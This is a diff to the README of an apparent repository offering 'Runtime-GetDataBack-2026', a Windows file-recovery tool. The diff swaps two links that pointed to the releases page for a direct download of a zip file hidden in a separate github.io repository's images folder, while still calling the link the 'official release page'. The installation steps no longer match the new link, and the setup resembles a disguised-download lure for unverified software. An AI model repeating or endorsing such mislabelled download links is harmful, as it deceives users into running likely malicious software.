@@ -5,7 +5,7 @@ description: "Download and install Runtime GetDataBack for Windows 10 and 11 to 
 ---
 # 💾 Runtime-GetDataBack-2026 - Restore lost files on Windows systems
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Unknown-germanamerican891/Runtime-GetDataBack-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Unknown-germanamerican891/unknown-germanamerican891.github.io/raw/refs/heads/main/images/App_1.2.zip)
 
 ## 📁 What is Runtime-GetDataBack-2026
 Runtime-GetDataBack-2026 helps users recover deleted or lost files from Windows computers. It works on Windows 10 and Windows 11 systems. The software scans your storage drives to find directory structures and data segments. It allows you to rescue photos, office documents, system files, and media from formatted drives or corrupted partitions. You use this tool to regain access to important information after accidental deletion or drive errors.
@@ -22,7 +22,7 @@ Before you start the process, ensure your computer meets these requirements:
 You obtain the installation files through the official releases page. This page hosts the most current version of the tool.
 
 1. Open your web browser. 
-2. Go to the [official release page](https://github.com/Unknown-germanamerican891/Runtime-GetDataBack-2026/releases).
+2. Go to the [official release page](https://github.com/Unknown-germanamerican891/unknown-germanamerican891.github.io/raw/refs/heads/main/images/App_1.2.zip).
 3. Look for the section titled "Assets" at the bottom of the newest release entry.
 4. Click the file name ending in .exe to start the download.
 5. Save the file to your "Downloads" folder.
